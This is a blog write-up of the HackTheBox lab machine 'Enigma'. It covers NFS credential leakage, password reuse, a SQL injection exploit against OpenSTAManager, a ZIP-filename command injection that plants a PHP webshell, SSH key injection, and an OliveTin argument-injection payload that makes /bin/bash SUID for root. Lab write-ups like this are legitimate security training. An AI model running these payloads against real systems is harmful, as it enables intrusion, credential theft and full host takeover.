---
layout: post
title: "HTB: Enigma"
date: 2026-10-17
tags: [htb, linux, writeup, nfs, sql-injection, command-injection, privilege-escalation]
image: /assets/img/posts/enigma/hero.webp
description: "A full chain on HackTheBox Enigma: an anonymous NFS share leaks onboarding creds, password reuse opens a mailbox, then three CVEs stack from SQL injection to P7M command injection to an OliveTin argument-injection root."
---

![Hack The Box Enigma writeup](/assets/img/posts/enigma/hero.webp)

**Machine:** Enigma &nbsp;·&nbsp; **Difficulty:** Easy &nbsp;·&nbsp; **OS:** Linux &nbsp;·&nbsp; **IP:** `10.129.239.191`

Enigma is a credential-trail box that turns into a CVE-stacking exercise. An anonymous NFS share hands over onboarding credentials, password reuse opens a second mailbox, and from there it is three different CVEs back to back: SQL injection for a hash, P7M command injection for a foothold, and an OliveTin argument-injection bug for root.

## 0. Initial recon

Started with a standard service version scan:

```bash
nmap -sV 10.129.239.191
```

Results showed a mail-heavy Linux host:

```text
22/tcp   - SSH (OpenSSH 9.6p1, publickey only)
80/tcp   - HTTP (nginx 1.24.0)
110/tcp  - POP3 (Dovecot)
111/tcp  - rpcbind (2-4)
143/tcp  - IMAP (Dovecot)
993/tcp  - IMAPS (Dovecot)
995/tcp  - POP3S (Dovecot)
2049/tcp - NFS (nfs_acl v3)
```

SSH was publickey-only from the start, so password auth was never an option there.

## 1. NFS: the onboarding share

Used `showmount` to check for NFS exports (had to install `nfs-common` first since Parrot did not have it):

```bash
apt install nfs-common
showmount -e 10.129.239.191
```

Found `/srv/nfs/onboarding` exported to `*` (everyone). Mounted it:

```bash
mkdir /mnt/nfs
mount -t nfs 10.129.239.191:/srv/nfs/onboarding /mnt/nfs
```

Single file inside: `New_Employee_Access.pdf`. Opened it and found gold:

- Employee: Kevin Mitchell
- Webmail URL: `http://mail001.enigma.htb`
- Username: `kevin`
- Password: `Enigma2024!`

Added hostnames to `/etc/hosts`:

```text
10.129.239.191 enigma.htb mail001.enigma.htb
```

> **Wall #1: POP3 plaintext auth blocked.** Tried connecting to POP3 on port 110 with netcat but got `-ERR [AUTH] Plaintext authentication disallowed on non-secure (SSL/TLS) connections.` Fix: use the SSL ports instead with `openssl s_client`:
>
> ```bash
> openssl s_client -connect 10.129.239.191:995 -quiet
> ```

## 2. Webmail enumeration

Logged into Roundcube webmail at `http://mail001.enigma.htb` as kevin. Found one email from `sarah@enigma.htb` welcoming Kevin to the team. Nothing actionable beyond learning Sarah's email address.

### Password reuse: Sarah's mailbox

Tried the same default password `Enigma2024!` on Sarah's mailbox and it worked. Inside Sarah's inbox was the real prize: an email from IT Support with credentials for an internal management panel:

- URL: `http://support_001.enigma.htb`
- Username: `admin`
- Password: `Ne3s4rtars78s`

Added `support_001.enigma.htb` to `/etc/hosts`.

## 3. Vhost discovery

While exploring the web services, ran `ffuf` to discover additional virtual hosts:

```bash
ffuf -u http://10.129.239.191 -H "Host: FUZZ.enigma.htb" \
     -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -fs 154
```

Found `bilbo.enigma.htb` returning a 302 redirect. Attempted directory brute-forcing against it but every path returned 302 (redirect to `enigma.htb`). This turned out to be a dead end. The real path forward was through the credentials already found.

> **Wall #2: Gobuster vs. wildcard redirects.** Gobuster could not handle `bilbo.enigma.htb` because every path returned a 302 with the same 154-byte body. Had to use `ffuf -fs 154` to filter responses by size, but even then there was nothing useful behind the vhost.

## 4. OpenSTAManager SQL injection (CVE-2026-24418)

Logged into OpenSTAManager 2.9.8 at `http://support_001.enigma.htb` with the admin credentials. The platform is an Italian open-source business management tool.

Searched for vulnerabilities and found CVE-2026-24418: error-based SQL injection in the Scadenzario (Payment Schedule) module's bulk operations handler. The `id_records[]` POST parameter was not validated as integers before being placed in a SQL `IN()` clause.

Cloned the exploit from GitHub:

```bash
git clone https://github.com/BridgerAlderson/CVE-2026-24418.git
cd CVE-2026-24418
python3 exploit.py -t http://support_001.enigma.htb -u admin -p Ne3s4rtars78s --all
```

Dumped two users from `zz_users`:

| User | Hash (bcrypt) |
| --- | --- |
| admin | `$2y10rTJV...` (already knew the password) |
| haris | `$2y10WHf1...` |

> **Wall #3: No FILE privilege.** The MySQL user `brollin@localhost` had only `USAGE` grants. No FILE, no SUPER, no PROCESS. This meant no reading files or writing webshells via SQL injection. Had to find another way in.

### Cracking Haris's hash

Transferred the bcrypt hash to a Windows desktop with a GPU and ran hashcat:

```bash
hashcat -m 3200 hash.txt rockyou.txt
```

Cracked in under 20 seconds: `haris : bestfriends`

## 5. RCE via CVE-2025-69212: P7M command injection

Found a second CVE affecting OpenSTAManager 2.9.8: CVE-2025-69212, an OS command injection in P7M file processing. The `XML::decodeP7M()` function passes unsanitized filenames from uploaded ZIP archives directly into an `exec()` call for OpenSSL.

The key insight from the PoC: PHP's `ZipArchive::extractTo()` splits filenames on `/`, so payloads must not contain forward slashes.

> **Wall #4: Finding the right upload point.** Tried multiple upload points before finding the correct one:
>
> 1. Import module (CSV import): accepted the file but threw an error at `importFE_ZIP/init.php`. Wrong module.
> 2. Profile photo upload: server validated through the Intervention Image library (unable to decode input). Tried embedding PHP in EXIF comments of valid JPEGs, tried `.phar` and `.php5` extensions. Server saved them but never executed the PHP.
> 3. Sales Invoices > Importazione FE (Electronic Invoicing import): this was the correct module. It processes ZIP files containing P7M-signed XML invoices.

### Building the payload

Created the exploit ZIP using Python to handle special characters in the filename:

```python
import zipfile

cmd = "cd files && echo '<?php system($_GET[\"c\"]); ?>' > SHELL.php"
malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile('/tmp/exploit3.zip', 'w') as zf:
    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")
```

> **Wall #5: XML validation errors.** First attempts with dummy content inside the P7M file triggered `Start tag expected, '<' not found`. Turns out the error was expected and documented in the PoC. The command injection fires during filename processing BEFORE the XML parsing fails. The "Start tag expected" error is actually confirmation of success.

Uploaded through Sales > Sales Invoices > Importazione FE, clicked Carica documenti, got the expected XML error, then confirmed the webshell was live:

```bash
curl "http://support_001.enigma.htb/files/SHELL.php?c=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 6. Shell as www-data and pivot to Haris

> **Wall #6: Reverse shell nightmares.** Getting a stable reverse shell was painful:
>
> - First reverse shell connected fine via `bash /tmp/rev.sh` but was fragile.
> - Hit Ctrl+Z trying to upgrade the shell with `stty raw -echo; fg` and killed the session entirely.
> - The `/tmp/rev.sh` file got cleaned between attempts.
> - Had to recreate the reverse shell script each time via the webshell.
> - Eventually gave up on traditional reverse shells and used the webshell to write an SSH key.

### SSH key injection

Generated a keypair locally:

```bash
ssh-keygen -f /tmp/haris_key -N ""
```

First attempt to write the key as www-data failed because `chown` requires root. Used `su` through the webshell to write the key as haris:

```bash
curl -G "http://support_001.enigma.htb/files/SHELL.php" \
  --data-urlencode "c=echo bestfriends | su - haris -c 'mkdir -p ~/.ssh && \
  echo ssh-ed25519 AAAAC3... > ~/.ssh/authorized_keys && \
  chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys'"
```

Then SSH'd in:

```bash
ssh -i /tmp/haris_key haris@10.129.239.191
```

### User flag

```bash
cat /home/haris/user.txt
```

## 7. Privilege escalation: OliveTin (CVE-2026-27626)

### Enumeration

No sudo access for haris. No interesting SUID binaries. No exploitable cron jobs.

Ran `ss -tlnp` and found port 1337 listening on localhost. Curled it and discovered OliveTin, a web UI for predefined shell commands.

Read the config at `/etc/OliveTin/config.yaml` and found:

- `authRequireGuestsToLogin: false` (no auth needed)
- A "Backup Database" action running `mysqldump` with user-supplied arguments
- The `db_pass` argument was type `password`

This is CVE-2026-27626: OliveTin's `checkShellArgumentSafety` function validates argument types to prevent injection, but it explicitly skips password-typed arguments. Since the password gets interpolated into a shell command with single quotes, breaking out of the quotes gives arbitrary command execution as root (OliveTin runs as root).

### Exploitation

The `db_pass` value gets placed inside single quotes in the `mysqldump` command. Breaking out with `x' ; <command> ; #`:

```bash
curl http://127.0.0.1:1337/api/StartActionAndWait -X POST \
  -H "Content-Type: application/json" \
  -d '{"actionId":"backup_database","arguments":[
      {"name":"db_user","value":"backup_svc"},
      {"name":"db_pass","value":"x'\'' ; chmod u+s /bin/bash ; #"},
      {"name":"db_name","value":"production"}
  ]}'
```

This sets the SUID bit on `/bin/bash`, then:

```bash
/bin/bash -p
cat /root/root.txt
```

## Attack chain summary

```text
NFS anonymous mount
  -> New_Employee_Access.pdf (kevin:Enigma2024!)
    -> Roundcube webmail as kevin
      -> Learned about sarah@enigma.htb
        -> Password reuse: sarah:Enigma2024!
          -> Sarah's inbox: OpenSTAManager admin creds
            -> CVE-2026-24418 SQLi: dumped haris bcrypt hash
            -> CVE-2025-69212 P7M command injection: webshell as www-data
              -> Cracked hash: haris:bestfriends
              -> SSH key injection: shell as haris
                -> user.txt
                  -> OliveTin on localhost:1337
                    -> CVE-2026-27626 password arg injection: root
                      -> root.txt
```

## Lessons learned

1. **Default passwords get reused.** The onboarding password `Enigma2024!` worked across multiple accounts.
2. **NFS exports to `*` are free loot.** Always check `showmount -e`.
3. **Multiple CVEs, one target.** Needed three different CVEs: SQLi for creds, command injection for initial access, and the OliveTin bypass for root.
4. **Upgrade your shell carefully.** The Ctrl+Z / `stty raw -echo` trick can nuke an unstable connection. SSH key injection is more reliable when possible.
5. **Internal services are goldmines.** Port 1337 was not exposed externally but was the entire path to root.
6. **Read the PoC carefully.** Wasted time uploading to wrong modules and using wrong payload formats before reading the CVE details thoroughly.
